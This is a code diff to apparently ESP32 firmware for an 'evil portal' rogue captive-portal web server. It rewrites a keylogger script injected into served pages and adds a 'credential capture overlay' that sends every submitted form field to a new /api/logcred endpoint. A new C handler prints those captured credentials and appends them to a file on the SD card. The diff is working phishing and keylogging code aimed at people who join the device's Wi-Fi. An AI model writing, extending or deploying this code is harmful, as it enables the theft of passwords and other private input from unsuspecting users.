@@ -713,14 +713,16 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 const char *javascript_code =
                     "<script>\n"
                     "(function(){\n"
-                    "function logKey(key){\n"
-                    "    var xhr = new XMLHttpRequest();\n"
-                    "    xhr.open('POST','/api/log',true);\n"
-                    "    xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');\n"
-                    "    xhr.send(JSON.stringify({key:key}));\n"
-                    "}\n"
-                    "document.addEventListener('keyup', function(e){ logKey(e.key); });\n"
-                    "document.addEventListener('input', function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ var val=e.target.value; var key=val.slice(-1); if(key) logKey(key);} });\n"
+                    "function logKey(k){fetch('/api/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:k})});}\n"
+                    "document.addEventListener('keyup',e=>logKey(e.key));\n"
+                    "document.addEventListener('input',e=>{if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){var v=e.target.value.slice(-1);if(v)logKey(v);}});\n"
+                    "// Credential capture overlay\n"
+                    "document.addEventListener('submit',function(ev){\n"
+                    "  var f=ev.target;if(f.tagName!=='FORM')return;\n"
+                    "  try{var d=new FormData(f);var o={};d.forEach((v,k)=>o[k]=v);\n"
+                    "      fetch('/api/logcred',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)});}\n"
+                    "  catch(e){}\n"
+                    "});\n"
                     "})();\n"
                     "</script>\n";
                 if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
@@ -972,6 +974,9 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+// Forward declaration for credential logger
+static esp_err_t log_cred_handler(httpd_req_t *req);
+
 httpd_handle_t start_portal_webserver(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.max_uri_handlers = 15;
@@ -989,6 +994,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
+        httpd_uri_t logcred_handler_uri = {
+            .uri = "/api/logcred", .method = HTTP_POST, .handler = log_cred_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
             .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_jpg = {
@@ -1007,6 +1014,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &microsoft_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
+        httpd_register_uri_handler(evilportal_server, &logcred_handler_uri);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
@@ -4121,3 +4129,40 @@ static ep_client_status_t *get_ep_client_status(httpd_req_t *req) {
     return NULL; // table full – will behave as global redirect
 }
  //---------------------------------------------------------------------
+
+// ---------------- Credential logging handler ------------------------
+static esp_err_t log_cred_handler(httpd_req_t *req) {
+    int total_len = req->content_len;
+    if (total_len <= 0 || total_len > 2048) {
+        httpd_resp_set_status(req, "400 Bad Request");
+        httpd_resp_send(req, NULL, 0);
+        return ESP_FAIL;
+    }
+    char *buf = malloc(total_len + 1);
+    if (!buf) {
+        httpd_resp_set_status(req, "500 Internal Server Error");
+        httpd_resp_send(req, NULL, 0);
+        return ESP_FAIL;
+    }
+    int received = httpd_req_recv(req, buf, total_len);
+    if (received <= 0) {
+        free(buf);
+        return ESP_FAIL;
+    }
+    buf[received] = '\0';
+
+    printf("Captured creds payload: %s\n", buf);
+
+    if (sd_card_manager.is_initialized && current_creds_filename[0] != '\0') {
+        FILE *f = fopen(current_creds_filename, "a");
+        if (f) {
+            fprintf(f, "%s\n", buf);
+            fclose(f);
+        }
+    }
+
+    free(buf);
+    httpd_resp_sendstr(req, "OK");
+    return ESP_OK;
+}
+//--------------------------------------------------------------------
